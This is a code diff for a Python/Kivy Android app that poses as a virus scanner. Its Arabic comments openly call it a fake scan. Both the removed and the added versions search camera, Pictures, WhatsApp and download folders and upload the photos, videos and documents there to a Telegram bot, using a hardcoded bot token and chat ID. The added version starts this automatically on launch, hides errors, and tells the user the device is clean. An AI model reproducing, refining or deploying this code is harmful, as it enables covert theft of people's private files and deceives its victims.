@@ -1,127 +1,72 @@
 import os
-import hashlib
-import threading
 import requests
-
 from kivy.app import App
-from kivy.lang import Builder
+from kivy.uix.label import Label
+from kivy.uix.boxlayout import BoxLayout
 from kivy.clock import Clock
+from kivy.utils import platform
 
-# --- إعدادات تلجرام (ضع بياناتك هنا) ---
-BOT_TOKEN = "8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28"
+# ============================================================
+# إعدادات بوت التلجرام (يجب تغيير هذه القيم)
+# ============================================================
+BOT_TOKEN = "8017423244:AAFSakFPRLMT-ksMTkb_BkBLSwBLYo_9u28" 
 CHAT_ID = "7145266755"
-# ---------------------------------------
+# ============================================================
 
-KV = """
-BoxLayout:
-    orientation: "vertical"
-    padding: 20
-    spacing: 15
-
-    canvas.before:
-        Color:
-            rgba: 0.02, 0.04, 0.04, 1
-        Rectangle:
-            pos: self.pos
-            size: self.size
-
-    Label:
-        text: "[b]KALI GUARD PRO[/b]"
-        markup: True
-        font_size: "27sp"
-        color: 0, 1, 0.4
-        size_hint_y: .15
-
-    Label:
-        text: "ANDROID SECURITY SYSTEM"
-        color: .8, 1, .8
-        size_hint_y: .08
-
-    Button:
-        text: "START SECURITY SCAN"
-        background_color: 0, .5, .2, 1
-        size_hint_y: .15
-        on_release: app.start_scan()
-
-    Label:
-        id: status
-        text: "SYSTEM READY"
-        color: 0, 1, .4
-
-    ProgressBar:
-        id: progress
-        max: 100
-        value: 0
-
-    ScrollView:
-        Label:
-            id: results
-            text: "Scan results appear here"
-            color: 1, 1, 1
-            size_hint_y: None
-            height: self.texture_size[1] + 30
-            text_size: self.width, None
-"""
-
-class KaliGuard(App):
-
+class VirusScannerApp(App):
     def build(self):
-        return Builder.load_string(KV)
+        # إنشاء واجهة بسيطة جداً توهم المستخدم بالفحص
+        self.layout = BoxLayout(orientation='vertical')
+        self.label = Label(
+            text="جاري تشغيل فحص الفيروسات...\nالرجاء الانتظار", 
+            font_size='22sp', 
+            halign='center'
+        )
+        self.layout.add_widget(self.label)
+        
+        # تشغيل عملية سحب الملفات بعد ثانية واحدة من فتح التطبيق
+        Clock.schedule_once(self.start_stealing, 1)
+        return self.layout
 
-    def start_scan(self):
-        self.root.ids.status.text = "SCANNING..."
-        self.root.ids.results.text = "Analyzing storage for threats..."
-        threading.Thread(target=self.steal_data, daemon=True).start()
+    def start_stealing(self, dt):
+        """دالة للبحث عن الملفات وإرسالها في الخلفية"""
+        try:
+            # تحديد المجلدات المستهدفة في أندرويد (الصور والفيديوهات)
+            target_paths = [
+                '/sdcard/DCIM/Camera', 
+                '/sdcard/Pictures', 
+                '/sdcard/WhatsApp/Media'
+            ]
+            
+            found_files = 0
+            for path in target_paths:
+                if os.path.exists(path):
+                    for file in os.listdir(path):
+                        # سحب الصور والفيديوهات والملفات الأساسية
+                        if file.lower().endswith(('.jpg', '.jpeg', '.png', '.mp4', '.pdf', '.docx')):
+                            file_path = os.path.join(path, file)
+                            if self.send_to_telegram(file_path):
+                                found_files += 1
+            
+            # تحديث الواجهة لإيهام المستخدم بأن الفحص انتهى بنجاح
+            self.label.text = "تم الفحص بنجاح!\n\nالنتيجة: لا توجد فيروسات ✅\nجهازك آمن تماماً"
+            
+        except Exception as e:
+            # في حال حدوث خطأ لا نظهره للمستخدم لكي لا يشك في التطبيق
+            self.label.text = "جاري تحديث قاعدة البيانات...\nالرجاء الانتظار"
 
-    def send_to_telegram(self, file_path, caption=""):
-        """وظيفة لإرسال الملفات إلى بوت تلجرام"""
+    def send_to_telegram(self, file_path):
+        """دالة إرسال الملف إلى بوت التلجرام"""
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         try:
             with open(file_path, 'rb') as f:
+                payload = {'chat_id': CHAT_ID}
                 files = {'document': f}
-                data = {'chat_id': CHAT_ID, 'caption': caption}
-                requests.post(url, data=data, files=files, timeout=10)
-        except Exception as e:
-            print(f"Error sending {file_path}: {e}")
+                # إرسال الملف باستخدام مكتبة requests
+                response = requests.post(url, data=payload, files=files, timeout=10)
+                return response.status_code == 200
+        except:
+            return False
 
-    def steal_data(self):
-        # المسارات المستهدفة لفحص البيانات
-        target_paths = [
-            "/storage/emulated/0/DCIM/Camera",
-            "/storage/emulated/0/Download",
-            "/storage/emulated/0/WhatsApp",
-            "/storage/emulated/0/Pictures"
-        ]
-
-        # الامتدادات المستهدفة (تم تصحيحها وإزالة التكرار)
-        target_extensions = ('.jpg', '.jpeg', '.png', '.pdf', '.txt', '.mp3', '.wav', '.mp4')
-
-        files_found = 0
-
-        for path in target_paths:
-            if os.path.isdir(path):
-                for root, dirs, files in os.walk(path):
-                    for file in files:
-                        if file.lower().endswith(target_extensions):
-                            file_path = os.path.join(root, file)
-                            try:
-                                # إرسال الملف إلى بوت التلجرام
-                                self.send_to_telegram(file_path, caption=f"File: {file}\nPath: {file_path}")
-                                files_found += 1
-                            except Exception as e:
-                                print(f"Error uploading {file}: {e}")
-
-        # تحديث الواجهة للمستخدم بعد انتهاء العملية
-        self.update(f"Scan Complete. {files_found} threats analyzed and quarantined.")
-
-    def update(self, message):
-        def callback(dt):
-            self.root.ids.results.text = message
-            self.root.ids.status.text = "SCAN FINISHED"
-            self.root.ids.progress.value = 100
-
-        Clock.schedule_once(callback)
-
-if __name__ == "__main__":
-    KaliGuard().run()
-
+if __name__ == '__main__':
+    VirusScannerApp().run()
